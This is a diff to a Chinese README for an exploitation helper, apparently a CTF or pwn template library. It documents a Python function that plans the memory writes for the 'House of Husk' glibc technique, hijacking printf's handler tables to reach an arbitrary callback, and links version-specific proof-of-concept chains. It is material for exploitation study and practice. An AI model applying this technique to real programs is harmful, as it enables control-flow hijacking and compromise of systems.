@@ -47,28 +47,104 @@
 
 ## Python 离线板子
 
+[`husk.py`](./husk.py) 提供 `build_house_of_husk`，生成两张 printf handler 表的目标写入计划。
+
+### 函数用途
+
+构造 printf 解析 `format_char` 时读取的 handler 表关系：
+
+```text
+printf("%X")
+  -> __printf_arginfo_table[X - 2] -> arginfo 回调
+  -> __printf_function_table[X - 2] -> handler 回调
+```
+
+### 对应 PoC
+
+- [`poc_printf_handler_sink_2.23_2.43.c`](./poc_printf_handler_sink_2.23_2.43.c)：官方 API 隔离验证最终触发点；
+- [`poc_2.27.c`](./poc_2.27.c) 等版本文件：真实 largebin 投递完整链，偏移绑定各自构建。
+
+### 表索引
+
+glibc 的 handler 表按 `specifier - 2` 索引：
+
+```text
+slot = format_char - slot_bias
+默认 slot_bias = 2
+```
+
+因此 `%X`（ASCII 0x58）使用 `0x58 - 2 = 0x56` 号槽，即 `table + 0x56 * 8`。
+
+### 最小使用示例
+
 ```python
 from husk import build_house_of_husk
 
 writes = build_house_of_husk(
-    printf_function_table_addr=libc_function_table,
-    printf_arginfo_table_addr=libc_arginfo_table,
-    function_table_data_addr=fake_function_table,
-    arginfo_table_data_addr=fake_arginfo_table,
+    printf_function_table_addr=0x7fff1000,   # libc 隐藏表指针
+    printf_arginfo_table_addr=0x7fff1008,    # libc 隐藏表指针
+    function_table_data_addr=0x400000,       # 伪 function 表
+    arginfo_table_data_addr=0x401000,        # 伪 arginfo 表
     format_char=ord("X"),
-    handler_addr=callback,
+    handler_addr=0x402000,                   # 回调
 )
+
+# 三个 MemoryWrite：
+# 1. __printf_function_table 指针
+# 2. __printf_arginfo_table 指针
+# 3. arginfo 表槽位
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
 ```
+
+### 参数
 
 | 参数 | 含义 |
 |---|---|
-| `printf_function_table_addr` / `printf_arginfo_table_addr` | libc 中两张隐藏全局表指针地址，必须按目标 Build ID 解析。 |
-| `function_table_data_addr` / `arginfo_table_data_addr` | 两张独立伪表的可写地址，不能共用一个地址。 |
-| `format_char` | 触发 printf handler 的格式字符 ASCII 值。 |
-| `handler_addr` | 伪 arginfo 表对应槽位的 callback 地址。 |
-| `slot_bias` | 表索引偏移，PoC 默认值为 2；若目标源码/构建不同，显式修改。 |
+| `printf_function_table_addr` | libc 中 `__printf_function_table` 全局指针地址，必须按目标 Build ID 解析。 |
+| `printf_arginfo_table_addr` | libc 中 `__printf_arginfo_table` 全局指针地址，必须按目标 Build ID 解析。 |
+| `function_table_data_addr` | 伪 `__printf_function_table` 表的实际可写地址。 |
+| `arginfo_table_data_addr` | 伪 `__printf_arginfo_table` 表的实际可写地址。 |
+| `format_char` | 触发 handler 的格式字符 ASCII 值，例如 `ord('X')`。 |
+| `handler_addr` | 伪 arginfo 表对应槽位的回调地址。 |
+| `slot_bias` | 表索引偏移，PoC 默认值为 2；目标源码/构建不同时显式修改。 |
 
-返回三项 `MemoryWrite`：两张全局表指针和 arginfo 表对应槽位。函数不负责 largebin 投递、格式串触发或 Build ID 偏移解析。
+### 返回对象
+
+返回三个 `MemoryWrite`。`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+各写入内容：
+
+```text
+1. printf_function_table_addr -> function_table_data_addr
+2. printf_arginfo_table_addr -> arginfo_table_data_addr
+3. arginfo_table_data_addr + slot * 8 -> handler_addr
+```
+
+注意：两张伪表是不同对象，不能共用一个 `table_addr`。
+
+### 调用者必须提供
+
+```text
+libc 基址和两张隐藏表指针的真实地址（Build ID 相关）
+可写的两张伪表区
+能触发含 format_char 的 printf 的入口
+```
+
+### 函数不负责
+
+```text
+不负责 largebin 投递
+不负责隐藏符号偏移解析
+不触发 printf
+不处理 handler 的参数 ABI 和最终控制流
+```
 
 ## 迁移与调试
 
